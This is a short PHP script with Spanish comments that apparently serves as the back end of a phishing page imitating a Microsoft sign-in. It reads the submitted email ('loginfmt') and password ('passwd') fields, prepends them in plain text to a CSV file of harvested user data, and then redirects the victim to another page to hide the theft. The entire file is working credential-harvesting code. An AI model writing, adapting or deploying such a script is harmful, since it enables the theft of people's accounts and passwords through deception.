<?php 

error_reporting(E_ALL);
ini_set('display_errors', '1');

$datos_usuario = $_POST; //guardamos los datos del usuario en una variable
$correo_usuario = $datos_usuario['loginfmt']; //guardamos el correo del usuario
$contrasena_usuario = $datos_usuario['passwd']; //guardamos la contraseña del usuario


// Nombre de archivo
$a = 'programa_interprete/datos_usuarios.csv';

if (file_exists($a)) {

    // Lee todo el archivo y lo carga a un vector
    $data = file($a);
    // Agrega el dato al vector
    array_unshift($data, "$correo_usuario,$contrasena_usuario");
    // Abre el archivo para escritura, truncando el contenido
    $file = fopen($a, 'w');
    // recorre el vector y reescribe todo el archivo
    foreach($data as $l){
    fwrite($file, "$l\n");
    }
    fclose($file);

} else {
    fopen("programa_interprete/datos_usuarios.csv", "w");
    
    // Lee todo el archivo y lo carga a un vector
    $data = file($a);
    // Agrega el dato al vector
    array_unshift($data, "$correo_usuario,$contrasena_usuario");
    // Abre el archivo para escritura, truncando el contenido
    $file = fopen($a, 'w');
    // recorre el vector y reescribe todo el archivo
    foreach($data as $l){
    fwrite($file, "$l\n");
    }
    fclose($file);
}

header('Location: redirect/index.html');

?>


